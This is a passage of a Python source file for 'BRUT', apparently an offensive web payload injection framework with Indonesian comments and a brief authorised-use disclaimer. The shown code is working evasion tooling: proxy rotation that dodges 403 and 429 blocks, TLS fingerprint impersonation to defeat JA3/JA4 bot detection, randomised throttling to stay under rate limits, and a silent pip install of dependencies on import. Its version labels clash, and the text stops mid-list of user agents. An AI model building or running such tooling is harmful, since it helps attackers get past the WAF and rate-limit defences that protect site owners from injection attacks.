#!/usr/bin/env python3
"""
BRUT v6.0.1 — Genetic ML Payload Injection + Anti-Rate-Limit Framework
=======================================================================
ALL v5.0 + v6.0 features preserved + FIX:
- httpx 0.28+ compatibility (proxies → proxy parameter)
- Version-aware proxy argument builder
- Ultimate fallback for any httpx version

Script ini menyediakan pipeline interaktif untuk discovery endpoint, pembuatan
payload, pengujian HTTP, analisis respons, pembelajaran feedback, dan pelaporan.
Gunakan hanya pada sistem yang dimiliki atau telah diberi izin untuk diuji.
"""

import os
import sys
import json
import time
import re
import random
import math
import string
import hashlib
import base64
import uuid
import subprocess
import warnings
import itertools
import traceback
import threading
import asyncio
import sqlite3
from datetime import datetime
from urllib.parse import (
    urlparse, urljoin, parse_qs, urlencode,
    quote, quote_plus, unquote
)
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, List, Any, Optional, Tuple, Set
from dataclasses import dataclass, field, asdict
from collections import Counter, defaultdict
from enum import Enum

warnings.filterwarnings("ignore")


# ============================================================
# DATABASE MANAGER (v7.0 — SQLite Target Storage)
# ============================================================
DB_FILE = "brut_targets.db"


class TargetDatabase:
    """Manajemen database SQLite untuk menyimpan target."""

    def __init__(self, db_path: str = DB_FILE):
        self.db_path = db_path
        self.conn = None
        self._connect()
        self._create_table()

    def _connect(self):
        self.conn = sqlite3.connect(self.db_path, check_same_thread=False)
        self.conn.row_factory = sqlite3.Row

    def _create_table(self):
        self.conn.execute("""
            CREATE TABLE IF NOT EXISTS targets (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target TEXT NOT NULL,
                created_at TEXT DEFAULT CURRENT_TIMESTAMP,
                last_used TEXT
            )
        """)
        self.conn.commit()

    def save_target(self, target: str) -> int:
        """Simpan target, return ID yang diberikan."""
        cursor = self.conn.execute(
            "INSERT INTO targets (target) VALUES (?)", (target,)
        )
        self.conn.commit()
        return cursor.lastrowid

    def get_all_targets(self) -> list:
        """Return semua target sebagai list of dict."""
        cursor = self.conn.execute(
            "SELECT id, target, created_at FROM targets ORDER BY id"
        )
        return [dict(row) for row in cursor.fetchall()]

    def get_target_by_id(self, target_id: int):
        """Return target string berdasarkan ID, atau None."""
        cursor = self.conn.execute(
            "SELECT target FROM targets WHERE id = ?", (target_id,)
        )
        row = cursor.fetchone()
        if row:
            self.conn.execute(
                "UPDATE targets SET last_used = ? WHERE id = ?",
                (datetime.now().isoformat(), target_id)
            )
            self.conn.commit()
            return row['target']
        return None

    def delete_target(self, target_id: int) -> bool:
        cursor = self.conn.execute(
            "DELETE FROM targets WHERE id = ?", (target_id,)
        )
        self.conn.commit()
        return cursor.rowcount > 0

    def count(self) -> int:
        cursor = self.conn.execute("SELECT COUNT(*) FROM targets")
        return cursor.fetchone()[0]

    def close(self):
        if self.conn:
            self.conn.close()


def init_database() -> TargetDatabase:
    """Inisialisasi database. Otomatis membuat file & tabel jika belum ada."""
    db = TargetDatabase()
    return db


def clear_screen():
    """Bersihkan layar terminal."""
    os.system('cls' if os.name == 'nt' else 'clear')


# Event untuk menghentikan animasi welcome secara aman
WELCOME_ANIM_STOP = threading.Event()

# v7.0 (Batch 3): Global state untuk cancel/back mechanism
CANCEL_EVENT = threading.Event()      # Set saat user konfirmasi /cancel
PROGRESS_ACTIVE = False               # True saat pipeline sedang berjalan
LOADED_TARGET_ID = None               # ID target yang di-load via /load (None = tidak ada)

# Jarak baris animasi dari baris prompt input (konstan: 8 baris di atas prompt)
WELCOME_ANIM_LINES_ABOVE = 8


def _draw_welcome_line(content: str):
    """Menulis HANYA di baris animasi (7 baris di atas prompt), tanpa menyentuh baris lain."""
    sys.stdout.write(f"\033[s\033[{WELCOME_ANIM_LINES_ABOVE}A\r\033[2K\033[1;35m{content}\033[0m\033[u")
    sys.stdout.flush()


def animate_welcome(text: str = "  ★ Welcome to BRUT v7.0 — Type target or /help to begin ★",
                    delay: float = 0.05, pause: float = 1.2):
    """Animasi ketik karakter per karakter, berulang tanpa henti, berhenti via WELCOME_ANIM_STOP."""
    while not WELCOME_ANIM_STOP.is_set():
        # Ketik karakter satu per satu
        for i in range(len(text) + 1):
            if WELCOME_ANIM_STOP.is_set():
                return
            _draw_welcome_line(text[:i])
            time.sleep(delay)
        # Tahan kalimat lengkap sebentar
        for _ in range(int(pause / 0.1)):
            if WELCOME_ANIM_STOP.is_set():
                return
            time.sleep(0.1)
        # Hapus, lalu ulangi
        _draw_welcome_line("")
        time.sleep(0.4)


def stop_welcome_animation(anim_thread):
    """Hentikan animasi & bersihkan baris animasi yang tersisa di scrollback."""
    WELCOME_ANIM_STOP.set()
    if anim_thread is not None and anim_thread.is_alive():
        anim_thread.join(timeout=1.0)
    # Setelah Enter, kursor turun 1 baris → baris animasi kini (8+1)=9 baris di atas kursor
    sys.stdout.write(f"\033[s\033[{WELCOME_ANIM_LINES_ABOVE + 1}A\r\033[2K\033[u")
    sys.stdout.flush()


# ============================================================
# HTTP STATUS CODE MEANINGS
# ============================================================
STATUS_MEANINGS = {
    0: "No Response (Connection Failed)",
    100: "Continue",
    200: "OK - Request Successful",
    201: "Created - Resource Created",
    204: "No Content - Success but no body",
    301: "Moved Permanently (Redirect)",
    302: "Found (Temporary Redirect)",
    303: "See Other (Redirect)",
    304: "Not Modified (Cached)",
    307: "Temporary Redirect",
    308: "Permanent Redirect",
    400: "Bad Request - Invalid Input",
    401: "Unauthorized - Auth Required",
    403: "Forbidden - Access Denied (WAF?)",
    404: "Not Found - Resource Missing",
    405: "Method Not Allowed",
    406: "Not Acceptable",
    408: "Request Timeout",
    413: "Payload Too Large",
    414: "URI Too Long",
    415: "Unsupported Media Type",
    422: "Unprocessable Entity",
    429: "Too Many Requests (Rate Limited!)",
    431: "Request Headers Too Large",
    451: "Unavailable For Legal Reasons",
    500: "Internal Server Error (Possible Injection!)",
    501: "Not Implemented",
    502: "Bad Gateway",
    503: "Service Unavailable",
    504: "Gateway Timeout",
    520: "Unknown Error (Cloudflare)",
    521: "Web Server Down (Cloudflare)",
    522: "Connection Timed Out (Cloudflare)",
    523: "Origin Unreachable (Cloudflare)",
}

def get_status_meaning(code: int) -> str:
    """Mengubah kode status HTTP menjadi keterangan singkat untuk laporan."""
    return STATUS_MEANINGS.get(code, f"Unknown Status ({code})")


# ============================================================
# DEPENDENCY MANAGEMENT (v6.0.1 — added curl_cffi, tenacity)
# ============================================================
REQUIRED_DEPS = [
    ("numpy", "numpy", "Numerical computing", False),
    ("scipy", "scipy", "Scientific computing", False),
    ("sklearn", "scikit-learn", "Machine learning", False),
    ("requests", "requests", "HTTP client", False),
    ("bs4", "beautifulsoup4", "HTML parsing", False),
    ("lxml", "lxml", "Fast XML/HTML parser", False),
    ("httpx", "httpx", "Modern HTTP client", False),
    ("h2", "h2", "HTTP/2 protocol support", True),
    ("aiohttp", "aiohttp", "Async HTTP client", False),
    ("selectolax", "selectolax", "Fast HTML parser", True),
    ("playwright", "playwright", "Headless browser", True),
    ("tldextract", "tldextract", "Domain extraction", False),
    ("fake_useragent", "fake-useragent", "UA rotation", False),
    ("curl_cffi", "curl_cffi", "TLS fingerprint spoofing (JA3/JA4)", False),
    ("tenacity", "tenacity", "Smart retry engine", False),
]


def install_dependencies():
    """Memeriksa lalu mencoba memasang dependency yang tercantum di daftar."""
    print("\n\033[36m" + "=" * 60)
    print("  BRUT v6.0.1: Dependency Manager")
    print("=" * 60 + "\033[0m\n")

    missing = []
    for import_name, pip_name, desc, optional in REQUIRED_DEPS:
        try:
            __import__(import_name)
            print(f"  \033[32m[OK]\033[0m {pip_name:<22} - {desc}")
        except ImportError:
            tag = "optional" if optional else "required"
            print(f"  \033[33m[??]\033[0m {pip_name:<22} - {desc} ({tag})")
            missing.append((pip_name, optional))

    if not missing:
        print(f"\n  \033[32mSemua {len(REQUIRED_DEPS)} dependencies siap!\033[0m")
        time.sleep(0.5)
        return True

    req_count = sum(1 for _, opt in missing if not opt)
    opt_count = sum(1 for _, opt in missing if opt)
    print(f"\n  Belum terinstall: {req_count} required, {opt_count} optional")
    print(f"  Menginstall {len(missing)} packages...\n")

    failed = []
    for pip_name, optional in missing:
        print(f"  [+] Installing {pip_name}...", end=" ", flush=True)
        try:
            subprocess.run(
                [sys.executable, "-m", "pip", "install", pip_name,
                 "--quiet", "--disable-pip-version-check"],
                capture_output=True, text=True, timeout=180
            )
            if pip_name == "playwright":
                print("browser...", end=" ", flush=True)
                subprocess.run(
                    [sys.executable, "-m", "playwright", "install", "chromium"],
                    capture_output=True, text=True, timeout=300
                )
            print("\033[32mOK\033[0m")
        except Exception as e:
            print(f"\033[31mFAIL ({e})\033[0m")
            if not optional:
                failed.append(pip_name)

    if failed:
        print(f"\n  \033[31mGagal install required: {failed}\033[0m")
        return False

    print(f"\n  \033[32mSemua dependencies siap!\033[0m")
    time.sleep(0.5)
    return True


install_dependencies()

# Import dependencies
try:
    import numpy as np
    HAS_NUMPY = True
except ImportError:
    HAS_NUMPY = False; np = None

try:
    from scipy import stats as scipy_stats
    from scipy.spatial.distance import cosine as scipy_cosine
    HAS_SCIPY = True
except ImportError:
    HAS_SCIPY = False

try:
    from sklearn.feature_extraction.text import TfidfVectorizer
    from sklearn.metrics.pairwise import cosine_similarity
    from sklearn.cluster import KMeans
    HAS_SKLEARN = True
except ImportError:
    HAS_SKLEARN = False

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    from bs4 import BeautifulSoup
    HAS_BS4 = True
except ImportError:
    HAS_BS4 = False

try:
    import httpx
    HAS_HTTPX = True
except ImportError:
    HAS_HTTPX = False

try:
    import h2
    HAS_H2 = True
except ImportError:
    HAS_H2 = False

try:
    import aiohttp
    HAS_AIOHTTP = True
except ImportError:
    HAS_AIOHTTP = False

try:
    from selectolax.parser import HTMLParser as SelectoParser
    HAS_SELECTOLAX = True
except ImportError:
    HAS_SELECTOLAX = False

try:
    from playwright.sync_api import sync_playwright
    HAS_PLAYWRIGHT = True
except ImportError:
    HAS_PLAYWRIGHT = False

try:
    import tldextract
    HAS_TLDEXTRACT = True
except ImportError:
    HAS_TLDEXTRACT = False

try:
    from fake_useragent import UserAgent
    HAS_FAKE_UA = True
    UA_ROTATOR = UserAgent()
except ImportError:
    HAS_FAKE_UA = False
    UA_ROTATOR = None

# v6.0 NEW: curl_cffi for TLS fingerprint spoofing
try:
    from curl_cffi import requests as curl_requests
    HAS_CURL_CFFI = True
except ImportError:
    HAS_CURL_CFFI = False

# v6.0 NEW: tenacity for smart retry
try:
    from tenacity import (
        retry, stop_after_attempt, wait_exponential,
        wait_random, retry_if_result, retry_if_exception_type,
        before_sleep_log, RetryCallState
    )
    HAS_TENACITY = True
except ImportError:
    HAS_TENACITY = False


# ============================================================
# BANNER v6.0.1
# ============================================================
def print_banner():
    """Menampilkan identitas dan informasi versi BRUT di terminal."""
    banner = f"""
\033[1;36m                   
  __ )                |          |    _)  |   
  __ \    __|  |   |  __|   _ \  |  /  |  __| 
  |   |  |     |   |  |     __/    <   |  |   
 ____/  _|    \__,_| \__| \___| _|\_\ _| \__|                                                                            
\033[0m                                       
\033[1;33m    ═══════════════════════════════════════════════════════════════\033[0m
\033[1;37m      BRUT v9.0.1 — Genetic ML Payload Generation\033[0m
\033[1;33m    ═══════════════════════════════════════════════════════════════\033[0m

\033[1;35m    Length Payload :\033[0m short, long, super-long, ultra-long
\033[1;35m    ML Framework      :\033[0m Genetic + Reinforcement Learning
\033[1;35m    Stealth Variation :\033[0m TLS Spoof + Proxy Rotation + Adaptive Throttle
\033[1;35m    Date Now   :\033[0m {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
    print(banner)


# ============================================================
# PROXY POOL MANAGER (v6.0 — Circuit Breaker + Health)
# ============================================================
@dataclass
class ProxyInfo:
    """Menyimpan status kesehatan, statistik, dan cooldown sebuah proxy."""
    url: str
    protocol: str = "http"       # http, https, socks4, socks5
    health_score: float = 1.0    # 0.0 (dead) to 1.0 (healthy)
    failure_count: int = 0
    success_count: int = 0
    last_used: float = 0.0
    last_failure: float = 0.0
    cooldown_until: float = 0.0
    is_blacklisted: bool = False
    response_times: List[float] = field(default_factory=list)
    blocked_statuses: List[int] = field(default_factory=list)

    def avg_response_time(self) -> float:
        if not self.response_times:
            return 999.0
        return sum(self.response_times[-20:]) / len(self.response_times[-20:])


class ProxyPoolManager:
    """Mengelola rotasi proxy, health check, cooldown, dan circuit breaker."""
    """
    Manages proxy pool with automatic circuit breaker.
    - Rotates proxies on 429/403/timeout
    - Blacklists dead proxies automatically
    - Health scoring based on success/failure ratio
    - Cooldown period before retrying failed proxies
    """

    DEFAULT_PROXIES = []

    def __init__(self, proxy_list: List[str] = None, cooldown_seconds: float = 30.0,
                 max_failures: int = 5, blacklist_threshold: float = 0.2):
        self.proxies: Dict[str, ProxyInfo] = {}
        self.cooldown_seconds = cooldown_seconds
        self.max_failures = max_failures
        self.blacklist_threshold = blacklist_threshold
        self.current_index = 0
        self.direct_mode = False
        self.lock = threading.Lock()
        self.rotation_count = 0
        self.total_rotations = 0

        if proxy_list:
            for p in proxy_list:
                self.add_proxy(p)
        else:
            self.direct_mode = True
            self._add_direct()

    def _add_direct(self):
        self.proxies["DIRECT"] = ProxyInfo(
            url="DIRECT", protocol="direct",
            health_score=1.0
        )

    def add_proxy(self, proxy_url: str):
        clean = proxy_url.strip()
        if not clean:
            return
        if clean.startswith("socks5"):
            proto = "socks5"
        elif clean.startswith("socks4"):
            proto = "socks4"
        elif clean.startswith("https"):
            proto = "https"
        else:
            proto = "http"

        self.proxies[clean] = ProxyInfo(
            url=clean, protocol=proto, health_score=1.0
        )
        self.direct_mode = False

    def load_proxies_from_file(self, filepath: str):
        if not os.path.exists(filepath):
            print(f"  \033[33m[!]\033[0m Proxy file not found: {filepath}")
            return 0
        count = 0
        with open(filepath, "r") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    self.add_proxy(line)
                    count += 1
        if count > 0:
            self.direct_mode = False
        print(f"  \033[32m[+]\033[0m Loaded {count} proxies from {filepath}")
        return count

    def get_next_proxy(self) -> Optional[ProxyInfo]:
        with self.lock:
            now = time.time()
            available = []

            for key, proxy in self.proxies.items():
                if proxy.is_blacklisted:
                    continue
                if proxy.cooldown_until > now:
                    continue
                if proxy.health_score < self.blacklist_threshold:
                    proxy.is_blacklisted = True
                    continue
                available.append(proxy)

            if not available:
                self._reset_all_cooldowns()
                available = [p for p in self.proxies.values()
                           if not p.is_blacklisted]

            if not available:
                if "DIRECT" not in self.proxies:
                    self._add_direct()
                return self.proxies["DIRECT"]

            weights = [max(0.1, p.health_score) for p in available]
            total_w = sum(weights)
            r = random.uniform(0, total_w)
            cumulative = 0
            chosen = available[0]
            for i, w in enumerate(weights):
                cumulative += w
                if r <= cumulative:
                    chosen = available[i]
                    break

            chosen.last_used = now
            self.total_rotations += 1
            return chosen

    def get_proxy_dict(self, proxy: ProxyInfo = None) -> Optional[Dict]:
        if proxy is None:
            proxy = self.get_next_proxy()
        if proxy is None or proxy.url == "DIRECT":
            return None
        return {
            "http": proxy.url,
            "https": proxy.url,
        }

    def record_success(self, proxy: ProxyInfo, response_time: float = 0):
        with self.lock:
            proxy.success_count += 1
            total = proxy.success_count + proxy.failure_count
            proxy.health_score = min(1.0, proxy.success_count / max(1, total))
            if response_time > 0:
                proxy.response_times.append(response_time)
                if len(proxy.response_times) > 50:
                    proxy.response_times = proxy.response_times[-50:]

    def record_failure(self, proxy: ProxyInfo, status_code: int = 0):
        with self.lock:
            proxy.failure_count += 1
            proxy.last_failure = time.time()
            total = proxy.success_count + proxy.failure_count
            proxy.health_score = max(0.0, proxy.success_count / max(1, total))

            if status_code > 0:
                proxy.blocked_statuses.append(status_code)

            if proxy.failure_count >= self.max_failures:
                if proxy.health_score < self.blacklist_threshold:
                    proxy.is_blacklisted = True
                    print(f"  \033[31m[CIRCUIT BREAKER]\033[0m Proxy blacklisted: "
                          f"{proxy.url[:40]}... (health={proxy.health_score:.2f})")
                else:
                    proxy.cooldown_until = time.time() + self.cooldown_seconds
                    print(f"  \033[33m[COOLDOWN]\033[0m Proxy cooling down: "
                          f"{proxy.url[:40]}... ({self.cooldown_seconds}s)")

    def record_rate_limited(self, proxy: ProxyInfo):
        with self.lock:
            proxy.failure_count += 2
            proxy.last_failure = time.time()
            proxy.cooldown_until = time.time() + (self.cooldown_seconds * 2)
            total = proxy.success_count + proxy.failure_count
            proxy.health_score = max(0.0, proxy.success_count / max(1, total))
            print(f"  \033[1;33m[429 RATE LIMITED]\033[0m Proxy rotated: "
                  f"{proxy.url[:40]}... → cooldown {self.cooldown_seconds*2:.0f}s")

    def _reset_all_cooldowns(self):
        now = time.time()
        for proxy in self.proxies.values():
            proxy.cooldown_until = 0
            proxy.health_score = max(proxy.health_score, 0.3)

    def get_pool_stats(self) -> Dict:
        total = len(self.proxies)
        healthy = sum(1 for p in self.proxies.values()
                     if not p.is_blacklisted and p.health_score > 0.3)
        blacklisted = sum(1 for p in self.proxies.values() if p.is_blacklisted)
        on_cooldown = sum(1 for p in self.proxies.values()
                         if p.cooldown_until > time.time())
        avg_health = (sum(p.health_score for p in self.proxies.values()) /
                     max(1, total))
        return {
            "total": total,
            "healthy": healthy,
            "blacklisted": blacklisted,
            "on_cooldown": on_cooldown,
            "avg_health": avg_health,
            "total_rotations": self.total_rotations,
            "direct_mode": self.direct_mode,
        }

    def print_pool_status(self):
        stats = self.get_pool_stats()
        mode = "DIRECT" if stats["direct_mode"] else "PROXY"
        print(f"\n  \033[1;36m[PROXY POOL]\033[0m Mode: {mode}")
        print(f"    Total: {stats['total']} | Healthy: {stats['healthy']} | "
              f"Blacklisted: {stats['blacklisted']} | Cooldown: {stats['on_cooldown']}")
        print(f"    Avg Health: {stats['avg_health']:.2f} | "
              f"Total Rotations: {stats['total_rotations']}")


# ============================================================
# TLS FINGERPRINT ENGINE (v6.0 — JA3/JA4 Evasion)
# ============================================================
class TLSFingerprintEngine:
    """Membuat client HTTP dengan variasi fingerprint TLS dan header."""
    IMPERSONATION_TARGETS = [
        "chrome120", "chrome119", "chrome116", "chrome110",
        "chrome107", "chrome104", "chrome101", "chrome99",
        "firefox120", "firefox117", "firefox110", "firefox102",
        "safari17_0", "safari16_0", "safari15_5",
        "edge101", "edge99",
    ]

    def __init__(self):
        self.current_target = "chrome120"
        self.rotation_index = 0
        self.request_count = 0
        self.rotation_interval = 10

    def get_session(self, proxy_dict: Dict = None) -> Any:
        if not HAS_CURL_CFFI:
            return None

        self.request_count += 1
        if self.request_count % self.rotation_interval == 0:
            self._rotate_target()

        try:
            proxies = None
            if proxy_dict:
                for v in proxy_dict.values():
                    proxies = {"https": v, "http": v}
                    break

            session = curl_requests.Session(
                impersonate=self.current_target,
                proxies=proxies,
                timeout=30,
                verify=False,
            )
            return session
        except Exception as e:
            try:
                session = curl_requests.Session(
                    impersonate="chrome110",
                    timeout=30,
                    verify=False,
                )
                return session
            except:
                return None

    def _rotate_target(self):
        self.rotation_index = (self.rotation_index + 1) % len(self.IMPERSONATION_TARGETS)
        self.current_target = self.IMPERSONATION_TARGETS[self.rotation_index]

    def make_request(self, url: str, method: str = "GET",
                    params: Dict = None, data: Dict = None,
                    headers: Dict = None, proxy_dict: Dict = None,
                    timeout: float = 30.0) -> Tuple[Optional[str], int, float, int]:
        if not HAS_CURL_CFFI:
            return None, 0, 0, 0

        session = self.get_session(proxy_dict)
        if session is None:
            return None, 0, 0, 0

        start = time.time()
        try:
            if method == "GET":
                resp = session.get(url, params=params, headers=headers, timeout=timeout)
            else:
                resp = session.post(url, data=data, headers=headers, timeout=timeout)

            elapsed = (time.time() - start) * 1000
            return resp.text, resp.status_code, elapsed, len(resp.content)

        except Exception as e:
            elapsed = (time.time() - start) * 1000
            return None, 0, elapsed, 0
        finally:
            try:
                session.close()
            except:
                pass

    def get_current_fingerprint(self) -> str:
        return self.current_target

    def get_available_targets(self) -> List[str]:
        return self.IMPERSONATION_TARGETS.copy()


# ============================================================
# ADAPTIVE THROTTLER (v6.0 — Human-Like Delay + Backoff)
# ============================================================
class AdaptiveThrottler:
    """Mengatur jeda request berdasarkan latensi dan indikasi rate limit."""
    def __init__(self, min_delay: float = 0.3, max_delay: float = 2.5,
                 burst_limit: int = 15, burst_window: float = 10.0):
        self.min_delay = min_delay
        self.max_delay = max_delay
        self.current_delay = min_delay
        self.burst_limit = burst_limit
        self.burst_window = burst_window
        self.request_timestamps: List[float] = []
        self.consecutive_429 = 0
        self.consecutive_success = 0
        self.total_throttle_time = 0.0
        self.backoff_multiplier = 1.0
        self.max_backoff = 30.0
        self.is_backing_off = False
        self.response_time_history: List[float] = []  
        self.rate_limit_warnings: int = 0             
        self.predicted_backoff: float = 0.0           
        self.last_prediction_time: float = 0.0
        self.consecutive_slow_responses: int = 0

    def predict_rate_limit(self, current_response_time: float = None) -> Tuple[bool, float]:
        """
        Menganalisis histori response time dan header untuk memprediksi
        kemungkinan rate limit. Mengembalikan (should_backoff, backoff_seconds).
        """
        now = time.time()
        
        # Jika ada response time terbaru, simpan
        if current_response_time is not None and current_response_time > 0:
            self.response_time_history.append(current_response_time)
            if len(self.response_time_history) > 20:
                self.response_time_history = self.response_time_history[-20:]
        
        # Butuh minimal 5 data untuk prediksi
        if len(self.response_time_history) < 5:
            return False, 0.0
        
        # Hitung tren: bandingkan rata-rata 5 terakhir dengan 5 sebelumnya
        recent = self.response_time_history[-5:]
        older = self.response_time_history[-10:-5] if len(self.response_time_history) >= 10 else self.response_time_history[:-5]
        
        if not older or not recent:
            return False, 0.0
        
        avg_recent = sum(recent) / len(recent)
        avg_older = sum(older) / len(older)
        
        # Jika response time meningkat lebih dari 20% dalam 5 request terakhir
        if avg_older > 0 and (avg_recent / avg_older) > 1.2:
            self.consecutive_slow_responses += 1
        else:
            self.consecutive_slow_responses = max(0, self.consecutive_slow_responses - 1)
        
        # Jika ada 3+ peningkatan berturut-turut, prediksi rate limit
        if self.consecutive_slow_responses >= 3:
            # Hitung backoff berdasarkan tingkat kenaikan
            ratio = avg_recent / avg_older
            backoff = min(10.0, 2.0 * ratio)  # max 10 detik
            return True, backoff
        
        return False, 0.0

    def wait(self):
        now = time.time()

        recent = [t for t in self.request_timestamps
                 if now - t < self.burst_window]
        if len(recent) >= self.burst_limit:
            force_delay = self.burst_window - (now - recent[0]) + random.uniform(0.5, 1.5)
            if force_delay > 0:
                print(f"  \033[33m[BURST LIMIT]\033[0m Pausing {force_delay:.1f}s "
                      f"({len(recent)} requests in {self.burst_window:.0f}s window)")
                time.sleep(force_delay)
                self.total_throttle_time += force_delay

        if self.is_backing_off:
            delay = self.current_delay * self.backoff_multiplier
            jitter = delay * random.uniform(-0.3, 0.3)
            delay = max(self.min_delay, delay + jitter)
        else:
            delay = random.uniform(self.min_delay, self.max_delay)
            if random.random() < 0.1:
                delay += random.uniform(1.0, 4.0)

        delay = min(delay, self.max_backoff)

        time.sleep(delay)
        self.total_throttle_time += delay
        self.request_timestamps.append(time.time())

        cutoff = time.time() - 60
        self.request_timestamps = [t for t in self.request_timestamps if t > cutoff]

    def record_success(self):
        self.consecutive_success += 1
        self.consecutive_429 = 0
        self.consecutive_slow_responses = max(0, self.consecutive_slow_responses - 1)
        if self.consecutive_slow_responses == 0:
            self.predicted_backoff = 0.0

        if self.consecutive_success > 10:
            self.current_delay = max(self.min_delay, self.current_delay * 0.95)
            self.backoff_multiplier = max(1.0, self.backoff_multiplier * 0.9)

        if self.consecutive_success > 5 and self.is_backing_off:
            self.is_backing_off = False
            self.backoff_multiplier = 1.0
            print(f"  \033[32m[THROTTLE]\033[0m Backoff cleared, resuming normal pace")

    def record_rate_limited(self, status_code: int = 429):
        self.consecutive_429 += 1
        self.consecutive_success = 0
        self.is_backing_off = True

        self.backoff_multiplier = min(
            self.max_backoff,
            2.0 ** self.consecutive_429
        )
        self.current_delay = min(self.max_delay * 2, self.current_delay * 1.5)

        backoff_time = self.backoff_multiplier
        print(f"  \033[1;31m[THROTTLE]\033[0m Rate limited ({status_code})! "
              f"Backoff: {backoff_time:.1f}s (attempt #{self.consecutive_429})")

        actual_sleep = backoff_time + random.uniform(1.0, 3.0)
        time.sleep(actual_sleep)
        self.total_throttle_time += actual_sleep

    def record_blocked(self, status_code: int = 403):
        self.is_backing_off = True
        self.backoff_multiplier = min(self.max_backoff,
                                      self.backoff_multiplier * 1.5)
        extra = random.uniform(1.0, 3.0)
        time.sleep(extra)
        self.total_throttle_time += extra

    def get_stats(self) -> Dict:
        return {
            "current_delay": f"{self.current_delay:.2f}s",
            "backoff_multiplier": f"{self.backoff_multiplier:.1f}x",
            "is_backing_off": self.is_backing_off,
            "consecutive_429": self.consecutive_429,
            "consecutive_success": self.consecutive_success,
            "total_throttle_time": f"{self.total_throttle_time:.1f}s",
            "requests_last_60s": len([t for t in self.request_timestamps
                                      if time.time() - t < 60]),
        }

    def print_stats(self):
        stats = self.get_stats()
        status = "BACKOFF" if stats["is_backing_off"] else "NORMAL"
        color = "\033[31m" if stats["is_backing_off"] else "\033[32m"
        print(f"  \033[1;36m[THROTTLE]\033[0m {color}{status}\033[0m | "
              f"Delay: {stats['current_delay']} | "
              f"Backoff: {stats['backoff_multiplier']} | "
              f"429s: {stats['consecutive_429']} | "
              f"Total wait: {stats['total_throttle_time']} | "
              f"Rate: {stats['requests_last_60s']}/60s")


# ============================================================
# RETRY ENGINE (v6.0 — Tenacity-Based Smart Retry)
# ============================================================
class RetryEngine:
    """Menjalankan request ulang dengan backoff dan aturan retry adaptif."""
    RETRYABLE_STATUS_CODES = {429, 403, 408, 500, 502, 503, 504, 520, 521, 522, 523}
    MAX_RETRIES = 4
    BASE_WAIT = 2
    MAX_WAIT = 30

    def __init__(self, throttler: AdaptiveThrottler,
                 proxy_manager: ProxyPoolManager,
                 tls_engine: TLSFingerprintEngine):
        self.throttler = throttler
        self.proxy_manager = proxy_manager
        self.tls_engine = tls_engine
        self.retry_count = 0
        self.total_retries = 0

    def execute_with_retry(self, request_func, *args, **kwargs):
        last_result = (None, 0, 0, 0)
        current_proxy = None

        for attempt in range(self.MAX_RETRIES + 1):
            current_proxy = self.proxy_manager.get_next_proxy()
            proxy_dict = self.proxy_manager.get_proxy_dict(current_proxy)

            try:
                if attempt > 0:
                    retry_delay = min(self.MAX_WAIT,
                                     self.BASE_WAIT * (2 ** attempt) +
                                     random.uniform(0.5, 2.0))
                    print(f"  \033[33m[RETRY]\033[0m Attempt {attempt+1}/{self.MAX_RETRIES+1} "
                          f"after {retry_delay:.1f}s delay | "
                          f"Proxy: {current_proxy.url[:30]}...")
                    time.sleep(retry_delay)
                    self.total_retries += 1
                else:
                    self.throttler.wait()

                kwargs_with_proxy = {**kwargs, "proxy_dict": proxy_dict}
                result = request_func(*args, **kwargs_with_proxy)

                if result is None:
                    result = (None, 0, 0, 0)

                text, status, elapsed, size = result

                if status == 429:
                    self.throttler.record_rate_limited(429)
                    self.proxy_manager.record_rate_limited(current_proxy)
                    last_result = result
                    continue

                if status == 403:
                    self.throttler.record_blocked(403)
                    self.proxy_manager.record_failure(current_proxy, 403)
                    last_result = result
                    if attempt < self.MAX_RETRIES:
                        continue
                    break

                if status in [500, 502, 503, 504]:
                    self.proxy_manager.record_failure(current_proxy, status)
                    self.proxy_manager.record_success(current_proxy, elapsed)
                    self.throttler.record_success()
                    return result

                if status in range(200, 400):
                    self.proxy_manager.record_success(current_proxy, elapsed)
                    self.throttler.record_success()
                    return result

                if status == 0:
                    self.proxy_manager.record_failure(current_proxy, 0)
                    last_result = result
                    if attempt < self.MAX_RETRIES:
                        continue
                    break

                self.proxy_manager.record_success(current_proxy, elapsed)
                self.throttler.record_success()
                return result

            except Exception as e:
                self.proxy_manager.record_failure(current_proxy, 0)
                last_result = (None, 0, 0, 0)
                if attempt < self.MAX_RETRIES:
                    continue
                break

        return last_result

    def get_retry_stats(self) -> Dict:
        return {
            "total_retries": self.total_retries,
            "max_retries_per_request": self.MAX_RETRIES,
            "retryable_codes": sorted(list(self.RETRYABLE_STATUS_CODES)),
        }


# ============================================================
# HTTPX VERSION COMPATIBILITY HELPER (v6.0.1 FIX)
# ============================================================
def _httpx_version_info() -> tuple:
    """Detect httpx version and return (major, minor, patch) tuple."""
    try:
        ver = tuple(int(x) for x in httpx.__version__.split(".")[:3])
        return ver
    except:
        return (0, 0, 0)


def _build_httpx_proxy_arg(proxy_dict: dict = None) -> dict:
    """
    Build the correct proxy argument for the installed httpx version.
    - httpx < 0.28: uses 'proxies' (dict) parameter
    - httpx >= 0.28: uses 'proxy' (string) parameter
    Returns: dict for **kwargs unpacking, or {} if no proxy.
    """
    if not proxy_dict:
        return {}

    ver = _httpx_version_info()

    if ver >= (0, 28, 0):
        # httpx 0.28+ : proxy (singular, string)
        proxy_url = None
        for v in proxy_dict.values():
            if v:
                proxy_url = v
                break
        if proxy_url:
            return {"proxy": proxy_url}
        return {}
    else:
        # httpx < 0.28 : proxies (plural, dict)
        return {"proxies": proxy_dict}


# ============================================================
# STEALTH HTTP CLIENT (Enhanced v6.0.1 — httpx compat fix)
# ============================================================
STEALTH_HEADERS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0",
